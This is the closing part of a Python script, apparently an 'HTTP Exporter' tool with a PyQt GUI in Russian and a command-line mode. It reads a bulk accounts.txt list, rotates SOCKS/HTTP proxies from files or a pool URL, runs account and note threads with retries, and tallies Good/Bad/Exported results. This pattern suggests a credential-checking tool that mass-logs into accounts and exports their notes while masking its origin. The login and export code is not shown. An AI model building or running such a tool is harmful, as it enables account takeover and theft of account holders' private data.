                            self.log.append(f"Proxy pool loaded successfully: {pool_loaded} proxies")
                        except Exception as e:
                            self.log.append(f"Proxy pool fetch error: {str(e)}")
                    self.proxyCountLbl.setText(f"Proxies: {len(lst)}")
                    self.log.append(f"Proxy preview: file={len(raw_file_list)} pool={pool_loaded} total={len(lst)}")

        def onProxyCount(self, n: int):
            self.proxyCountLbl.setText(f"Proxies: {n}")

        def onStats(self, s: str):
            self.statsLbl.setText(s)

        def onLog(self, msg: str):
            self.log.append(msg)

        def onFin(self):
            self.log.append("Готово")
            self.refreshTimer.stop()
            self.btnStart.setEnabled(True)
            self.btnPause.setEnabled(False)
            self.btnStop.setEnabled(False)

        def togglePause(self):
            if not self.worker:
                return
            if self.btnPause.text() == "Пауза":
                self.worker.request_pause(True)
                self.btnPause.setText("Возобновить")
            else:
                self.worker.request_pause(False)
                self.btnPause.setText("Пауза")

        def stop(self):
            if self.worker:
                self.worker.request_stop()
                self.btnPause.setEnabled(False)
                self.btnStop.setEnabled(False)

def main_cli() -> None:
    import argparse
    parser = argparse.ArgumentParser(description="Nimbus HTTP Exporter CLI")
    parser.add_argument("--accounts", required=True, help="Path to accounts.txt")
    parser.add_argument("--proxies", help="Path to proxies.txt")
    parser.add_argument("--proxy-url", help="Proxy pool URL")
    parser.add_argument("--out", default="exports", help="Output directory")
    parser.add_argument("--threads-acc", type=int, default=2, help="Account threads")
    parser.add_argument("--threads-note", type=int, default=8, help="Note threads")
    parser.add_argument("--retries", type=int, default=3, help="Retries per account")
    parser.add_argument("--proxy-ttl", type=int, default=10, help="Proxy TTL minutes")
    parser.add_argument("--timeout", type=float, default=180.0, help="Download timeout")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy usage")
    parser.add_argument("--extended-log", action="store_true", help="Show server responses")
    parser.add_argument("--proxy-scheme", choices=["socks5", "socks4", "http"], default="socks5", help="Proxy scheme for raw proxies")
    parser.add_argument("--fast", action="store_true", help="Use async mode for faster processing")


    args = parser.parse_args()

    rot = ProxyRotator(
        read_lines(Path(args.proxies)) if args.proxies else [],
        args.proxy_ttl,
        args.proxy_url,
        not args.no_proxy,
        args.proxy_scheme,
    )

    async def _run():
        def log_cb(msg: str):
            print(msg)
        def stats_cb(i: int, g: int, b: int, e: int, exp: int, total: int):
            print(f"In work: {i} | Good: {g} | Bad: {b} | Error: {e} | Exported: {exp}/{total}")
        await run_batch(Path(args.accounts), Path(args.out), rot, args.threads_acc, args.retries, args.threads_note, args.timeout, log_cb, stats_cb, args.extended_log, use_async=args.fast)

    if sys.platform.startswith('win'):
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass
    asyncio.run(_run())


if __name__ == "__main__":
    if not GUI_AVAILABLE or "--cli" in sys.argv:
        if "--cli" in sys.argv:
            sys.argv.remove("--cli")
        main_cli()
    else:
        app = QApplication(sys.argv)
        if sys.platform.startswith('win'):
            try:
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            except Exception:
                pass
        w = App(); w.resize(1000, 720); w.show()




        sys.exit(app.exec())
